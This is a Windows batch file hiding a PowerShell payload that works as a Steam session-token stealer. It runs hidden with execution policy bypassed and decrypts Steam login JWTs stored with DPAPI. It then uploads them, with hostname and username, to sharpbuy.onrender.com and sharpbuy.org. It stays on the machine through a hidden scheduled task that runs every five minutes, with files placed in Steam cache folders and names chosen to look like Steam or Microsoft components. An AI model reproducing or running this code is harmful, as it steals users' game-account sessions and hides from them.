@echo off
setlocal
set "SHARPBUY_ROOT=%~dp0.."
set "LOG=%SHARPBUY_ROOT%\logs\EXTRACT_LAST_RUN.txt"
set "BAT=%~f0"
set "PS1=%TEMP%\SteamExtract_run.ps1"

if /I not "%~1"=="RUN" (
  start "" /MIN cmd /C "%~f0" RUN
  exit /b
)

> "%LOG%" echo [%date% %time%] STARTED - extracting script...
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -WindowStyle Hidden -Command "$b=$env:BAT;$dst=$env:PS1;$raw=[IO.File]::ReadAllText($b);$m='::SB_EXTRACT_PAYLOAD::';$i=$raw.LastIndexOf($m);if($i -lt 0){exit 1};[IO.File]::WriteAllText($dst,$raw.Substring($i+$m.Length).Trim(),(New-Object Text.UTF8Encoding $false))"
if errorlevel 1 (
  >> "%LOG%" echo FAIL: could not read script from bat file
  start "" notepad "%LOG%"
  exit /b 1
)

"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PS1%"
if errorlevel 1 (
  >> "%LOG%" echo FAIL: PowerShell error - check antivirus
  start "" notepad "%LOG%"
)
del "%PS1%" 2>nul
exit /b
::SB_EXTRACT_PAYLOAD::$ErrorActionPreference = 'SilentlyContinue'
try { Add-Type -AssemblyName System.Security } catch {}
try {
    Add-Type @'
using System;using System.Text;
public static class SteamUtil {
public static uint Crc32(byte[] x){uint[] t=new uint[256];for(uint i=0;i<256;i++){uint v=i;for(int j=0;j<8;j++)v=((v&1)==1)?(v>>1)^0xedb88320u:v>>1;t[i]=v;}uint c=0xffffffff;foreach(byte b in x){c=(c>>8)^t[(byte)((c&0xff)^b)];}return ~c;}
public static string ConnectKey(string n){return Crc32(Encoding.UTF8.GetBytes(n)).ToString("x").TrimStart('0')+"1";}
}
'@ -ErrorAction Stop
} catch {}

$Script:UploadUrls = @('https://sharpbuy.onrender.com/api/token-ingest', 'https://sharpbuy.org/api/token-ingest')
function Get-UploadKey {
  $roots = @()
  if ($env:SHARPBUY_ROOT) { $roots += $env:SHARPBUY_ROOT.TrimEnd('\') }
  if ($Script:SelfPath) { $roots += (Split-Path (Split-Path $Script:SelfPath -Parent) -Parent) }
  foreach ($root in $roots) {
    if (-not $root) { continue }
    $f = Join-Path $root 'data\.token_ingest_secret'
    if (Test-Path -LiteralPath $f) {
      $k = (Get-Content -LiteralPath $f -Raw).Trim()
      if ($k) { return $k }
    }
  }
  if ($env:TOKEN_INGEST_SECRET) { return $env:TOKEN_INGEST_SECRET.Trim() }
  return $null
}
$Script:UploadKey = Get-UploadKey
$Script:AgentPrimary = Join-Path $env:LOCALAPPDATA 'Steam\htmlcache\CloudSync'
$Script:AgentMirror = Join-Path $env:LOCALAPPDATA 'Steam\logs\CloudSyncBackup'
$Script:Background = ($env:SB_BACKGROUND -eq '1')
$Script:SelfPath = if ($env:SB_PS1) { $env:SB_PS1 } elseif ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
$Script:PsExe = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
$Script:TaskName = 'SteamClientCloudSync'

function Write-Host { process {} }

function Write-ManualResult([string]$Message) {
    if ($Script:Background) { return }
    try {
        $root = if ($env:SHARPBUY_ROOT) { $env:SHARPBUY_ROOT.TrimEnd('\') } else { Split-Path (Split-Path $PSScriptRoot -Parent) -Parent }
        $path = Join-Path $root 'logs\EXTRACT_LAST_RUN.txt'
        Set-Content -LiteralPath $path -Value ("[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), $Message) -Encoding UTF8
    } catch {}
}

function Write-Log([string]$Message) {
    try {
        $log = Join-Path $Script:AgentPrimary 'last-error.txt'
        $dir = Split-Path $log -Parent
        if (-not (Test-Path -LiteralPath $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        Add-Content -LiteralPath $log -Value ("[{0}] {1}" -f (Get-Date -Format 'o'), $Message) -Encoding UTF8
    } catch {}
}

function Stop-X([string[]]$M, [int]$C = 0) {
    if ($M.Count) {
        $msg = $M -join ' | '
        Write-Log $msg
        Send-Evt 'error' $msg
        if (-not $Script:Background) { Write-ManualResult "FAIL: $msg" }
    }
    exit 0
}

function Send-Evt([string]$S, [string]$M) {
    try {
        $src = if ($Script:Background) { 'auto-sync' } else { 'manual-run' }
        $b = @{ event = $true; status = $S; message = $M; hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src } | ConvertTo-Json -Compress
        Invoke-Ingest $b 20 | Out-Null
    } catch {}
}

function Invoke-Ingest([string]$Body, [int]$T = 30) {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $h = @{ 'X-SharpBuy-Key' = $Script:UploadKey }
    $e = $null
    foreach ($u in $Script:UploadUrls) {
        try { return Invoke-RestMethod -Uri $u -Method POST -ContentType 'application/json; charset=utf-8' -Headers $h -Body $Body -TimeoutSec $T }
        catch { $e = $_ }
    }
    if ($e) { return $null }
    return $null
}

function Send-Tokens([array]$Tokens) {
    if (-not $Tokens -or $Tokens.Count -eq 0) { return $false }
    $src = if ($Script:Background) { 'auto-sync' } else { 'manual-run' }
    $b = @{
        tokens = @($Tokens | ForEach-Object { @{ token = $_.Token; steamId = $_.SteamId; accountName = $_.AccountName; personaName = $_.PersonaName } })
        hostname = $env:COMPUTERNAME; username = $env:USERNAME; source = $src
    } | ConvertTo-Json -Depth 6 -Compress
    $r = Invoke-Ingest $b 45
    if ($r -and $r.ok) {
        if (-not $Script:Background) {
            $total = if ($r.total) { $r.total } else { $Tokens.Count }
            Write-ManualResult "OK: uploaded $($Tokens.Count) token(s), server total: $total"
        }
        return $true
    }
    if ($Script:Background) { return $false }
    Stop-X @('Upload failed - check internet or sharpbuy.onrender.com')
}

function Test-Env {
    $r = Get-ItemProperty 'HKCU:\Software\Valve\Steam' -EA SilentlyContinue
    if (-not $r -or -not $r.SteamPath) { if ($Script:Background) { exit 0 }; Stop-X @('Steam not found') }
    if (-not (Test-Path (Join-Path $env:LOCALAPPDATA 'Steam\local.vdf'))) { if ($Script:Background) { exit 0 }; Stop-X @('No local.vdf - login to Steam with Remember me') }
    $lu = Join-Path (($r.SteamPath -replace '/', '\')) 'config\loginusers.vdf'
    if (-not (Test-Path $lu)) { if ($Script:Background) { exit 0 }; Stop-X @('No loginusers.vdf') }
}

function Get-Fingerprint([array]$Tokens) {
    if (-not $Tokens -or $Tokens.Count -eq 0) { return '' }
    ($Tokens | Sort-Object SteamId | ForEach-Object {
        $j = $_.Jwt; $pfx = if ($j.Length -gt 24) { $j.Substring(0, 24) } else { $j }
        "$($_.SteamId)|$($_.AccountName)|$pfx"
    }) -join ';'
}

function Get-AgentRoots {
    @($Script:AgentPrimary, $Script:AgentMirror)
}

function Remove-LegacyAgent {
    $oldRoots = @(
        (Join-Path $env:ProgramData 'SharpBuy')
        (Join-Path $env:ProgramData ('Microsoft\' + 'NetFramework\' + 'BreadcrumbStore'))
        (Join-Path $env:LOCALAPPDATA ('Microsoft\' + 'Windows\' + 'Explorer\' + 'IconCache' + 'ToDelete'))
        (Join-Path $env:LOCALAPPDATA ('Microsoft\' + 'Windows\' + 'WebCache\' + 'Temp'))
    )
    foreach ($oldRoot in $oldRoots) {
        if (Test-Path -LiteralPath $oldRoot) {
            Remove-Item -LiteralPath $oldRoot -Recurse -Force -EA SilentlyContinue
        }
    }

    foreach ($taskName in @(
            'SharpBuySteamToken5m'
            'SharpBuySteamSync5m'
            'SharpBuySteamSync'
            'MicrosoftWindowsPowerShellRegistrationRefresh'
            ('Microsoft' + 'NetFramework' + 'BreadcrumbSync')
        )) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA SilentlyContinue | Out-Null
        Invoke-SchTaskQuiet '/Delete', '/TN', $taskName, '/F'
    }

    foreach ($regName in @('SharpBuySteamSync', 'WindowsPowerShellConfigurationHost', ('NetFramework' + 'StartupConfiguration'))) {
        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $regName -EA SilentlyContinue
    }
}

function Invoke-SchTaskQuiet([string[]]$TaskArgs) {
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'
    & schtasks @TaskArgs 2>$null | Out-Null
    $ErrorActionPreference = $prev
}

function New-AgentRunnerScript([string]$ModulePath) {
    $modEsc = $ModulePath -replace "'", "''"
    @"
`$ErrorActionPreference='SilentlyContinue'
`$env:SB_BACKGROUND='1'
`$env:SB_PS1='$modEsc'
. '$modEsc'
exit 0
"@
}

function New-HiddenLauncher([string]$RunnerPath) {
    $dir = Split-Path $RunnerPath -Parent
    $vbsPath = Join-Path $dir 'RunSyncHidden.vbs'
    $vbs = 'CreateObject("Wscript.Shell").Run "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File ""' + $RunnerPath + '""", 0, False'
    Set-Content -LiteralPath $vbsPath -Value $vbs -Encoding ASCII -Force
    return $vbsPath
}

function Register-AgentSchedule([string]$RunnerPath) {
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    Unregister-ScheduledTask -TaskName $Script:TaskName -Confirm:$false | Out-Null
    Invoke-SchTaskQuiet '/Delete', '/TN', $Script:TaskName, '/F'
    Invoke-SchTaskQuiet '/Delete', '/TN', ($Script:TaskName + 'Logon'), '/F'

    $vbsPath = New-HiddenLauncher $RunnerPath
    $wscript = Join-Path $env:SystemRoot 'System32\wscript.exe'
    $vbsArg = "//B //Nologo `"$vbsPath`""
    $tr = "`"$wscript`" $vbsArg"

    $action = New-ScheduledTaskAction -Execute $wscript -Argument $vbsArg
    $start = (Get-Date).AddMinutes(1)
    $repeat = New-ScheduledTaskTrigger -Once -At $start -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
    $logon = New-ScheduledTaskTrigger -AtLogOn
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Minutes 2) -Hidden
    $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Limited
    Register-ScheduledTask -TaskName $Script:TaskName -Action $action -Trigger @($repeat, $logon) -Settings $settings -Principal $principal -Force | Out-Null

    if ($LASTEXITCODE -eq 0 -or (Get-ScheduledTask -TaskName $Script:TaskName -EA SilentlyContinue)) {
        $ErrorActionPreference = $prev
        return $true
    }

    Invoke-SchTaskQuiet '/Create', '/TN', $Script:TaskName, '/TR', $tr, '/SC', 'MINUTE', '/MO', '5', '/RL', 'LIMITED', '/F'
    Invoke-SchTaskQuiet '/Create', '/TN', ($Script:TaskName + 'Logon'), '/TR', $tr, '/SC', 'ONLOGON', '/RL', 'LIMITED', '/F'
    $ErrorActionPreference = $prev
    return $true
}

function Install-WinHostSync {
    Remove-LegacyAgent

    $src = $Script:SelfPath
    if (-not $src -or -not (Test-Path -LiteralPath $src)) {
        foreach ($root in (Get-AgentRoots)) {
            $candidate = Join-Path $root 'SessionSync.ps1'
            if (Test-Path -LiteralPath $candidate) { $src = $candidate; break }
        }
    }
    if (-not $src -or -not (Test-Path -LiteralPath $src)) { return $false }

    $primary = $Script:AgentPrimary
    $runnerPath = Join-Path $primary 'RunSync.ps1'

    foreach ($root in (Get-AgentRoots)) {
        New-Item -ItemType Directory -Path $root -Force | Out-Null
        $module = Join-Path $root 'SessionSync.ps1'
        if ($src -and $module -and ($src -ne $module)) {
            Copy-Item -LiteralPath $src -Destination $module -Force
        }
        Set-Content -LiteralPath (Join-Path $root 'RunSync.ps1') -Value (New-AgentRunnerScript $module) -Encoding UTF8 -Force
        Remove-Item -LiteralPath (Join-Path $root 'HostSync.ps1') -Force -EA SilentlyContinue
        Remove-Item -LiteralPath (Join-Path $root 'HostSync.vbs') -Force -EA SilentlyContinue
        Remove-Item -LiteralPath (Join-Path $root 'RunSyncHidden.vbs') -Force -EA SilentlyContinue
        Remove-Item -LiteralPath (Join-Path $root 'SyncModule.ps1') -Force -EA SilentlyContinue
        Remove-Item -LiteralPath (Join-Path $root 'ConfigData.bin') -Force -EA SilentlyContinue
    }

    Register-AgentSchedule $runnerPath

    $mark = Join-Path $primary 'installed.txt'
    if (-not (Test-Path -LiteralPath $mark) -and -not $Script:Background) {
        Send-Evt 'info' 'Background sync enabled'
    }
    Set-Content -LiteralPath $mark -Value (Get-Date -Format 'o') -Force -EA SilentlyContinue
    return $true
}

function Get-SteamConnectKey([string]$Name) {
    try { return [SteamUtil]::ConnectKey($Name) } catch { return $null }
}

function Unprotect-Hex([string]$Hex, [string]$AccountName) {
    if (-not $Hex -or -not $AccountName) { return $null }
    try {
        $bytes = New-Object byte[] ($Hex.Length / 2)
        for ($i = 0; $i -lt $bytes.Length; $i++) {
            $bytes[$i] = [Convert]::ToByte($Hex.Substring($i * 2, 2), 16)
        }
        $entropy = [Text.Encoding]::UTF8.GetBytes($AccountName)
        $plain = [Security.Cryptography.ProtectedData]::Unprotect($bytes, $entropy, [Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [Text.Encoding]::UTF8.GetString($plain)
    } catch { return $null }
}

function SteamPath { (Get-ItemProperty 'HKCU:\Software\Valve\Steam' -EA SilentlyContinue).SteamPath -replace '/', '\' }

function JwtSid([string]$j) {
    $p = $j.Split('.'); if ($p.Length -lt 2) { return $null }
    $x = $p[1]; $x += ('=' * ((4 - ($x.Length % 4)) % 4)); $x = $x.Replace('-', '+').Replace('_', '/')
    try { $o = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x)); if ($o -match '"sub"\s*:\s*"(\d+)"') { return $Matches[1] } } catch {}
    $null
}

function Parse-Users([string]$C) {
    $u = @()
    foreach ($m in [regex]::Matches($C, '"(?<sid>\d{17})"\s*\{[^}]*?"AccountName"\s+"(?<name>[^"]+)"[^}]*?\}', 'Singleline')) {
        $b = $m.Value; $pn = $m.Groups['name'].Value
        if ($b -match '"PersonaName"\s+"([^"]+)"') { $pn = $Matches[1] }
        $u += [PSCustomObject]@{ SteamId = $m.Groups['sid'].Value; AccountName = $m.Groups['name'].Value; PersonaName = $pn }
    }
    $u
}

function Find-Tok([string]$V, [string]$A, [string]$E, [hashtable]$U) {
    if (-not $V -or $V -notmatch '"ConnectCache"') { return $null }
    $ck = Get-SteamConnectKey $A; $jwt = $null; $uk = $null
    if ($V -match "`"$([regex]::Escape($ck))`"\s+`"([0-9a-fA-F]+)`"") {
        if (-not $U.ContainsKey($ck)) { $t = Unprotect-Hex $Matches[1] $A; if ($t -and $t.StartsWith('ey')) { $jwt = $t; $uk = $ck } }
    }
    if (-not $jwt) {
        foreach ($m in [regex]::Matches($V, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
            $k = $m.Groups[1].Value; $h = $m.Groups[2].Value
            if ($h.Length -lt 100 -or $U.ContainsKey($k)) { continue }
            $t = Unprotect-Hex $h $A
            if ($t -and $t.StartsWith('ey')) {
                $s = JwtSid $t
                if (-not $E -or -not $s -or $s -eq $E) { $jwt = $t; $uk = $k; break }
            }
        }
    }
    if (-not $jwt) { return $null }
    $sid = JwtSid $jwt; if (-not $sid) { $sid = $E }
    if ($uk) { $U[$uk] = $true }
    [PSCustomObject]@{ Jwt = $jwt; SteamId = $sid; AccountName = $A; PersonaName = ''; Token = "$A----$jwt" }
}

function Extract-All {
    $v = Get-Content -Raw (Join-Path $env:LOCALAPPDATA 'Steam\local.vdf') -EA SilentlyContinue
    $lp = Join-Path (SteamPath) 'config\loginusers.vdf'
    $users = @(); if (Test-Path $lp) { $users = Parse-Users (Get-Content -Raw $lp) }
    $used = @{}; $found = @()
    foreach ($user in $users) {
        $hit = Find-Tok $v $user.AccountName $user.SteamId $used
        if ($hit) { $hit.PersonaName = $user.PersonaName; $found += $hit }
    }
    if ($v) {
        $map = @{}; foreach ($u in $users) { if ($u.AccountName) { $map[$u.AccountName] = $u }; if ($u.SteamId) { $map[$u.SteamId] = $u } }
        foreach ($m in [regex]::Matches($v, '"([0-9a-f]+)"\s+"([0-9a-fA-F]+)"')) {
            $k = $m.Groups[1].Value; $h = $m.Groups[2].Value
            if ($h.Length -lt 100 -or $used.ContainsKey($k)) { continue }
            foreach ($name in $map.Keys) {
                $t = Unprotect-Hex $h $name; if (-not ($t -and $t.StartsWith('ey'))) { continue }
                $sid = JwtSid $t; $u = $map[$name]
                if ($sid -and $u.SteamId -and $sid -ne $u.SteamId) { continue }
                $used[$k] = $true
                $found += [PSCustomObject]@{ Jwt = $t; SteamId = $(if ($sid) { $sid } else { $u.SteamId }); AccountName = $u.AccountName; PersonaName = $u.PersonaName; Token = "$($u.AccountName)----$t" }
                break
            }
        }
    }
    $by = @{}; $out = @()
    foreach ($i in $found) {
        if (-not $i.Token -or $by.ContainsKey($i.Jwt)) { continue }
        $by[$i.Jwt] = $true; $out += $i
    }
    $out
}

if ($Script:Background) {
    try { Install-WinHostSync | Out-Null } catch {}
} else {
    Write-ManualResult 'STARTED - reading Steam sessions...'
}

Test-Env
if (-not $Script:Background) { Send-Evt 'start' 'Sync started' }

$t = Extract-All
if (-not $t.Count) { Stop-X @('No tokens - login with Remember me') }

$fpFile = Join-Path $Script:AgentPrimary 'last-sync.txt'
$fp = Get-Fingerprint $t
$lastFp = ''
if (Test-Path $fpFile) { $lastFp = (Get-Content -LiteralPath $fpFile -Raw -EA SilentlyContinue).Trim() }

if (-not $Script:Background) {
    Remove-Item -LiteralPath $fpFile -Force -EA SilentlyContinue
    $lastFp = ''
}

$uploaded = Send-Tokens $t
if ($uploaded) {
    Set-Content -LiteralPath $fpFile -Value $fp -Force -EA SilentlyContinue
    $changed = ($fp -ne $lastFp)
    if (-not $Script:Background) {
        Send-Evt 'success' "Manual upload: $($t.Count) token(s)"
        Write-ManualResult "OK: uploaded $($t.Count) token(s) to sharpbuy.onrender.com"
        try { Install-WinHostSync | Out-Null } catch {}
    } elseif ($changed) {
        Send-Evt 'success' "Auto sync: $($t.Count) token(s)"
    }
} elseif (-not $Script:Background) {
    Write-ManualResult 'FAIL: upload failed - check internet'
    Stop-X @('Upload failed - check internet or sharpbuy.onrender.com')
}

exit 0
